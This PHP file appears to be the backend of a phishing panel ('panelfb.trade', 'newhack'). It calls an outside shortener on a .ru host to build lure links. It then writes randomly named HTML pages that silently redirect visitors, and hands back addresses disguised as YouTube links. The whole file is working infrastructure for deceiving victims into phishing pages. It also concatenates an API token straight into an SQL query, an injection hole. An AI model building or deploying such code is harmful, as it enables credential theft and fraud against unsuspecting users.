<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
header('Content-Type: application/json; charset=utf-8');
require_once (dirname(dirname(__FILE__)) . '/configuracionsqlserver.php');
require_once "./random_string.php";


if($_SERVER['HTTP_REFERER'] !== 'https://panelfb.trade/'){
 die('Unauthorized access');}

$cottorra = trim($_GET['cottorra']) ? $_GET['cottorra'] : null;
$domain = trim($_GET['domain']) ? $_GET['domain'] : null;
$theme= trim($_GET['theme']) ? $_GET['theme'] : null;
$api_token = trim($_GET['api_token']) ? $_GET['api_token'] : null;

$sql = "SELECT usuario from usuarios WHERE token = '$api_token'";
$query = $pdo->prepare($sql);
$query->execute();
$username = $query->fetch();
if ($query->execute()) {
	
$linkbase = file_get_contents('https://2vql.ru/api.php?api=panelfb.trade/newhack/index.php?username='.$username["usuario"].'%26pl='.$theme);
$linkUrl =  file_get_contents('https://'.$domain.'/apiv2.php?cottorra='.$cottorra.'&linkbase='.$linkbase);	
echo $linkUrl;	
	
	
	



$NAMEFILE = generateRandomString();
$DOMAIN = $_SERVER['SERVER_NAME'];

$contentHTML = '<script src="'.$PROTOCOLO.$API.'" type="text/javascript" async="true"></script>';
	
$contentHTML = '<script languaje="javascript"> setTimeout(location.href="'.$linkbase.'",8000); </script>';


file_put_contents("youtube/links". "/" .$NAMEFILE, $contentHTML);
	
//echo json_encode(array("link" => $DOMAIN."/video/".$NAMEFILE));
echo  'https://youtube.'.$DOMAIN.'/'.$NAMEFILE;
	
	
	
	
	
	
	
	
	
	
	
}